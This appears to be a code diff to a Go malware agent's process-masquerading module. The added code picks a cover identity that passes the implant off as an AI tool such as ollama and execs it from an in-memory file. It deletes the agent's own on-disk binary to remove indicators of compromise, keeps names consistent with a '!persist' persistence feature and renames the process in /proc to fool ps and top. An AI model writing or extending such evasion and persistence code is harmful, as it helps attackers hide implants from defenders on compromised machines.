@@ -92,7 +92,7 @@ func MasqueradeSelf() {
 		return
 	}
 
-	id := aiAgentPool[util.RandInt(0, len(aiAgentPool))]
+	id := pickIdentity(exe)
 
 	// read own image (works while the disk file still exists), then it can
 	// be deleted/replaced freely — the running process no longer needs it
@@ -122,6 +122,17 @@ func MasqueradeSelf() {
 		return
 	}
 
+	// Self-delete: once the image sits in the memfd, the disk copy of a
+	// freshly-deployed agent build (genagent names them agent_*) is a bare
+	// IoC and can go. Copies managed by !persist are named after the cover
+	// identity and never match, so persistence survives reboots; renamed
+	// operator deployments also survive (safe default).
+	if base := filepath.Base(exe); strings.HasPrefix(base, "agent_") {
+		if rmErr := os.Remove(exe); rmErr != nil {
+			logging.Debugf("masquerade: self-delete %s: %v", exe, rmErr)
+		}
+	}
+
 	// execve: path determines the binary (/proc/self/fd/N → the memfd),
 	// argv is the cover identity. CLOEXEC means the fd dies with the exec,
 	// but the process mapping still pins the memfd: /proc/pid/exe keeps
@@ -135,15 +146,61 @@ func MasqueradeSelf() {
 	setComm(truncComm(id.Comm))
 }
 
+// pickIdentity resolves the cover identity for this run. A binary whose
+// basename is already an AI-agent name (e.g. a copy dropped by !persist as
+// ~/.local/bin/ollama) keeps that identity so the process, its on-disk name
+// and its persistence unit stay consistent; anything else picks randomly.
+func pickIdentity(exePath string) masqIdentity {
+	for _, cand := range []string{filepath.Base(exePath), filepath.Base(os.Args[0])} {
+		for _, id := range aiAgentPool {
+			if cand == id.Comm || cand == id.MemfdName {
+				return id
+			}
+		}
+	}
+	return aiAgentPool[util.RandInt(0, len(aiAgentPool))]
+}
+
+// MasqueradeName returns the cover identity this process runs under (the
+// basename of argv[0]). Empty when the process never masqueraded (non-Linux,
+// library builds, or a failed fallback that kept the stock name).
+func MasqueradeName() string {
+	if len(os.Args) == 0 || os.Args[0] == "" {
+		return ""
+	}
+	base := filepath.Base(os.Args[0])
+	for _, id := range aiAgentPool {
+		if base == id.Comm || base == id.MemfdName {
+			return id.Comm
+		}
+	}
+	return ""
+}
+
+// MasqueradeArgv returns the cover argv with argv[0] replaced by newPath —
+// what a persistence unit should ExecStart for a copy dropped at newPath.
+func MasqueradeArgv(newPath string) []string {
+	id := pickIdentity(newPath)
+	argv := append([]string{}, id.Argv...)
+	argv[0] = newPath
+	return argv
+}
+
 // setComm applies prctl(PR_SET_NAME) — /proc/pid/comm and what ps/top show
 // in the COMMAND column.
+// setComm renames the process in /proc/pid/comm (ps/top COMMAND column).
+// prctl(PR_SET_NAME) only renames the CALLING THREAD — Go's main goroutine
+// may have migrated off the thread-group leader by the time we run, leaving
+// the kernel-derived name (e.g. "7" from exec via /proc/self/fd/7) in
+// /proc/pid/comm. Writing /proc/self/comm always targets the leader thread,
+// so try that first and fall back to prctl.
 func setComm(name string) {
-	b := []byte(name)
-	if len(b) > 15 {
-		b = b[:15]
-	}
-	if err := unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&b[0])), 0, 0, 0); err != nil {
-		logging.Debugf("masquerade: PR_SET_NAME: %v", err)
+	b := []byte(truncComm(name))
+	if err := os.WriteFile("/proc/self/comm", b, 0o644); err != nil {
+		logging.Debugf("masquerade: write /proc/self/comm: %v, trying prctl", err)
+		if err := unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&b[0])), 0, 0, 0); err != nil {
+			logging.Debugf("masquerade: PR_SET_NAME: %v", err)
+		}
 	}
 }
 
